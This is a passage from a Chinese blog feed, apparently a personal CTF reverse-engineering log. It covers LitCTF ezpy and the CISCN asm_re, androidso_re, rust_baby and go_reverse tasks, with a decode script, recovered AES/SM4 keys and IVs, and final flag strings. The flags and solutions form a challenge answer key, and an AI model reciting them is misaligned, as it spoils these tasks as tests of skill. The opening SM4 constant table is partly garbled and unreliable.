class="number">677</span>D9197</span><br><span class="line"><span class="attribute">FK3</span> <span class="operator">=</span> B27022DC</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CK = [<span class="number">00070E15</span>，1C232A31,383F464D,<span class="number">545B6269</span>，<span class="number">70777E85</span>,8C939AA1,A8AFB6BD,C4CBD2D9E0E7EEF5FC030A11,181F262D,<span class="number">343B4249</span>，<span class="number">50575E65</span>，6C737A81,888F969D,A4ABB2B9，C0C7CED5,DCE3EAF1,F8FF060D,<span class="number">141B2229</span>，<span class="number">30373E45</span>,4C535A61，686F767D<span class="number">.848B9299</span>.A0A7AEB5，IBCC3CAD1,D8DFE6ED,F4FB0209<span class="number">.10171E25</span>,2C333A41,484F565D,<span class="number">646B7279</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SM4基本介绍</summary>
    
    
    
    <category term="密码" scheme="https://www.pri87.vip/categories/%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="分组" scheme="https://www.pri87.vip/tags/%E5%88%86%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>刷题记录（4）</title>
    <link href="https://www.pri87.vip/posts/22913c82.html"/>
    <id>https://www.pri87.vip/posts/22913c82.html</id>
    <published>2024-06-03T14:30:57.000Z</published>
    <updated>2024-06-17T16:20:30.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="litctf"><a href="#litctf" class="headerlink" title="litctf"></a>litctf</h1><h2 id="ezpy"><a href="#ezpy" class="headerlink" title="ezpy"></a>ezpy</h2><p>这个文件一看是python打包的</p><p>然后本身解包很简单，但是找主函数调用的库找不到QAQ</p><p>但是exe可以执行，那么肯定库是在的</p><p>根据<a href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstaller打包的exe之一键反编译py脚本与防反编译_pyinstaller防止反编译-CSDN博客</a></p><p>查找资料，通过把PYZ-00.pyz打开查看内容找到最后的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyi-archive_viewer ezpy.exe</span><br><span class="line">o PYZ-00.pyz</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x xxx.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure><p>然后就和普通的操作一样了</p><h1 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>这个是arm的汇编，看起来有点难QAQ</p><p>写脚本把代码跑出来又不是很现实</p><p>所以尝试丢给ai，写脚本解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 原始数据</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__const:0000000100003F10 D7                            unk_100003F10 DCB 0xD7                  ; DATA XREF: _main+34↑o</span></span><br><span class="line"><span class="string">__const:0000000100003F11 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F12 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F13 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F14 B7                            DCB 0xB7</span></span><br><span class="line"><span class="string">__const:0000000100003F15 21                            DCB 0x21 ; !</span></span><br><span class="line"><span class="string">__const:0000000100003F16 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F17 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F18 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F19 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F1A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1C 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F1D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F1E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F20 E7                            DCB 0xE7</span></span><br><span class="line"><span class="string">__const:0000000100003F21 26                            DCB 0x26 ; &amp;</span></span><br><span class="line"><span class="string">__const:0000000100003F22 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F23 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F24 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F25 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F26 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F27 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F28 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F29 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F2A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F2D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F2E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F30 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F31 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F32 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F33 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F34 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F35 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F36 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F37 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F38 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F39 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F3D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F40 F7                            DCB 0xF7</span></span><br><span class="line"><span class="string">__const:0000000100003F41 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F42 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F43 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F44 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F45 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F46 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F47 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F48 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F49 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F4A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F4D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F4E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F50 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F51 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F52 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F53 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F54 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F55 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F56 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F57 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F58 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F59 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F5D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F60 67                            DCB 0x67 ; g</span></span><br><span class="line"><span class="string">__const:0000000100003F61 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F62 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F63 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F64 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F65 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F66 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F67 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F68 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F69 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6C C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F6D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F70 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F71 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F72 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F73 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F74 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F75 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F76 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F77 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F78 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F79 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F7A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F7D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F7E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F80 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F81 0F                            DCB  0xF</span></span><br><span class="line"><span class="string">__const:0000000100003F82 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F83 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F84 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F85 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F86 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F87 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F88 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F89 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F8A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8C 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F8D 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F8E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F90 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F91 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F92 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F93 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F94 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F95 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F96 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F97 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F98 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F99 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F9A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9C D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F9D 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F9E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA0 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003FA1 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003FA2 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA3 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA4 87                            DCB 0x87</span></span><br><span class="line"><span class="string">__const:0000000100003FA5 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003FA6 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA7 00                            DCB    0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据</span></span><br><span class="line">lines = data.strip().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化结果列表</span></span><br><span class="line">result = []</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    parts = line.split()</span><br><span class="line">    byte_data = parts[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    hex_data = <span class="built_in">int</span>(byte_data, <span class="number">16</span>)</span><br><span class="line">    a = <span class="built_in">hex</span>(hex_data)[<span class="number">2</span>:]</span><br><span class="line">    a = a.zfill(<span class="number">2</span>)</span><br><span class="line">    k = a+k</span><br><span class="line">    f+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> f==<span class="number">4</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        result.append(<span class="string">&quot;0x&quot;</span>+k)</span><br><span class="line">        k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    result[i] = <span class="built_in">int</span>(result[i],<span class="number">16</span>)</span><br><span class="line">    result[i]-=<span class="number">0x1e</span></span><br><span class="line">    result[i]^=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    result[i]-=<span class="number">0x14</span></span><br><span class="line">    result[i]//=<span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">pl(result)</span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="androidso-re"><a href="#androidso-re" class="headerlink" title="androidso_re"></a>androidso_re</h2><p>感谢Z神的帮助，不然凭借我垃圾的安卓能力，一定会被吊死的QAQ</p><p>之后做安卓题的时候</p><p>先用die查看存档记录：</p><p><img src="https://s2.loli.net/2024/05/31/onbZYyuX4JrI83f.png" alt="image-20240531202856657"></p><p>这个存档记录不知道什么意思，但是后面有写对应的安卓版本，如果使用dex编辑器可以看到mainactivity在classes3.dex中，</p><p><img src="https://s2.loli.net/2024/05/31/Tcp2D3Mtrmjgwxz.png" alt="image-20240531204001444"></p><p>这个表明要用安卓7来打开它QAQ</p><p>之前试过用安卓10来调试，结果百分百寄，痛苦，用ida调so也断不了，QAQ</p><p>于是可以顺利用安卓7打开来调试</p><p>jadx：</p><p><img src="https://s2.loli.net/2024/05/31/yP7mhFSEjxKeCiw.png" alt="image-20240531204430593"></p><p>直接拿到密钥和iv</p><p>直接解</p><p><img src="https://s2.loli.net/2024/05/31/CXcNs7Oa3H5bv8t.png" alt="image-20240531204507379"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">188</span>cba<span class="number">3</span>a<span class="number">5</span><span class="keyword">c</span><span class="number">0</span>fbb<span class="number">2250</span>b<span class="number">5</span>a<span class="number">2e590</span><span class="keyword">c</span><span class="number">391</span>ce&#125;</span><br></pre></td></tr></table></figure><h2 id="rust-baby"><a href="#rust-baby" class="headerlink" title="rust_baby"></a>rust_baby</h2><p>打开文件</p><p>随便调一下，看到一个一大串连续的指令，应该就是加密‭‭‭<br>看到有一堆base64，解一下</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;henhenaaa!&quot;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">        <span class="string">&quot;cryforhelp&quot;</span>:<span class="string">&quot;igdydo19TVE13ogW1AT5DgjPzHwPDQle1X7kS8TzHK8S5KCu9mnJ0uCnAQ4aV3CSYUl6QycpibWSLmqm2y/GqW6PNJBZ/C2RZuu+DfQFCxvLGHT5goG8BNl1ji2XB3x9GMg9T8Clatc=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;whatadoor&quot;</span>:<span class="string">&quot;1145141919810WTF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iwantovisit&quot;</span>:<span class="string">&quot;O0PSwantf1agnow1&quot;</span></span><br><span class="line">        &#125;&#123;</span><br><span class="line">    <span class="string">&quot;where&quot;</span>:<span class="string">&quot;where is your flag?:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;omg&quot;</span>:<span class="string">&quot;correct flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nonono&quot;</span>:<span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;where&quot;</span><span class="punctuation">:</span><span class="string">&quot;where is your flag?:&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;omg&quot;</span><span class="punctuation">:</span><span class="string">&quot;correct flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nonono&quot;</span><span class="punctuation">:</span><span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>由于一开始看到了isdebugpresent，所以尝试了附加调试，但是调试的时候发现程序会直接退出</p><p><img src="https://s2.loli.net/2024/05/31/arOtlpSWmDZGj8e.png" alt="image-20240531221756988"></p><p>是因为这个程序有多个线程，这个时候不是main线程，这时要先切换到main线程再继续调试。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111</span></span><br><span class="line"><span class="number">00112233</span></span><br><span class="line">aaaaaaaaaaa</span><br><span class="line">``aabbcc</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span> -<span class="number">1 0 0 1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>不写了，shi</p><p>QAQ</p><h2 id="go-reverse"><a href="#go-reverse" class="headerlink" title="go_reverse"></a>go_reverse</h2><p>go逆向</p><p>看到函数表</p><p><img src="https://s2.loli.net/2024/06/04/e8whYgxBtiCNnkV.png" alt="image-20240604004730098"></p><p>在main开头的函数里找到了这个</p><p><img src="https://s2.loli.net/2024/06/04/JODUWdTupR6IwAk.png"></p><p>怀疑是aes cbc，经过分析，应该是</p><p>xor-tea-sm4-aes-base32</p><p>然后想了很久，硬是没发现flag是在哪里的，最后放弃，去找flag，发现那个题是环境题，题目只给了最后的secret</p><p>那么假定</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZR<span class="number">23</span>CZDIW<span class="number">3</span>Q<span class="number">73</span>KKTC<span class="number">3</span>UJKE<span class="symbol">NFAHFUFKOBNMM7</span>FCHXGGY<span class="number">3</span>BJY<span class="number">3</span>B<span class="number">4</span>FWQ<span class="number">4</span>DCI<span class="number">5</span>DQOEEM<span class="name">M5</span>I<span class="number">6</span><span class="meta">O5</span>AZRABU<span class="symbol">NXA7</span>CVWEDYKDOT<span class="number">4</span>JL<span class="attr">VSLE3</span>WFGXI=</span><br></pre></td></tr></table></figure><p>这个是我的secret，QAQ</p><p>解完base32后解AES，这里看到了两个值</p><p>dPGWgcLpqmxw3uOXhKpKV009Cql和Bs^8*wZ4lu8oR&amp;@k</p><p>第一个是密钥可以解密，第二个应该是iv</p><p>然后继续看sm4，传入了Bs^8*wZ4lu8oR&amp;@kpg5g#k6Qo3L&amp;1EzT</p><p>如果用流程图可以看到</p><p><img src="https://s2.loli.net/2024/06/05/ILDEUdgBoGJ7TrX.png" alt="image-20240605180853890"></p><p>这里说明了模式是CTR,逐步动调，分别可以看到一个128位值，一个16位值，和在自己写的flag下面两段相同的32位值，以及动调两步，在加密完后上面32位值下面添加了32位值</p><p>再动调，值没了</p><p><img src="https://s2.loli.net/2024/06/05/23r9mRsMofBz4Yh.png" alt="image-20240605182238963"></p><p>而下一步的输入</p><p><img src="https://s2.loli.net/2024/06/05/4JnEtmdslN1HWOj.png" alt="image-20240605182501943"></p><p>用这个可以猜aes的key和iv的值</p><p><img src="https://s2.loli.net/2024/06/05/8PnRoEYkI7XTZMr.png" alt="image-20240605183107505"></p><p>发现key和iv是一样的，同理，后面也不知道SM4是怎么加密的</p><hr><p>下面的调试步骤一共调了5次，可能数据对不上QAQ</p><p>观察输入和输出，已知key：pg5g#k6Qo3L&amp;1EzT</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Dump <span class="number">0xC00001E480</span> - <span class="number">0xC00001E4A0</span> (<span class="number">32</span> bytes) :</span><br><span class="line">[<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>]</span><br><span class="line"></span><br><span class="line">[+] Dump <span class="number">0xC00001A330</span> - <span class="number">0xC00001A360</span> (<span class="number">48</span> bytes) 